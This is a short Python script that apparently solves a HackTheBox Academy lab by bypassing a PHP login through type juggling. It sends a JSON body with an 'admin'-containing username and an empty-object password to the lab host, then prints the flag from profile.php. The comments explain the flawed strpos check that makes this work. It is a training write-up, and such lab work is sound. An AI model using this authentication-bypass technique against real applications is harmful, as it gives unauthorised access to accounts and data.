#!/usr/bin/env python3

"""
Created this script to solve the HackTheBox Academy lab called 'Authentication Bypass' for the module called 'Whitebox Attacks'. 
This script exploits a php type juggling to bypass the login and get access to the admin page
"""

import requests

session= requests.Session()
target= "83.136.248.74:48488"
proxies={"http":"http://127.0.0.1:8080"}
headers={"Content-type":"application/json"} 
data= '{"username":"notadmin","password":{}}' #The '{}' passed to the password value is an empty array

"""
The 'notadmin' value passed to the username value is because the source code shows the following check performed:

if(strpos($_SESSION['username'], 'admin') != false) {
    $content = get_admin_info();
   }

The problem with this code is that it only checks if the $_SESSION['username'] contains the word 'admin'.  
So as long as the word admin is in the username then in it will get access to the admin $content.  
The '{}' passed as the password value is an empty array. The source code didn't show any admin user, in which case the comparison being made 
could very well be an empty array.
"""

def find_secret(response):
    for line in response.text.splitlines():
        if "success" in line.lower() or "HTB{" in line.upper():
            print(line)
            break
        else:
            pass
            
# function to perform php type juggling to bypass login
def php_type_juggling():
    # bypass login
    response= session.post(url=f"http://{target}", proxies=proxies, data=data, headers=headers)

    find_secret(response)

    # Get the secret flag
    response= session.get(url=f"http://{target}/profile.php", proxies=proxies, headers=headers)
    
    find_secret(response)

try:
    php_type_juggling()
except KeyboardInterrupt:
    print("Ctrl + c detected, exiting gracefully")
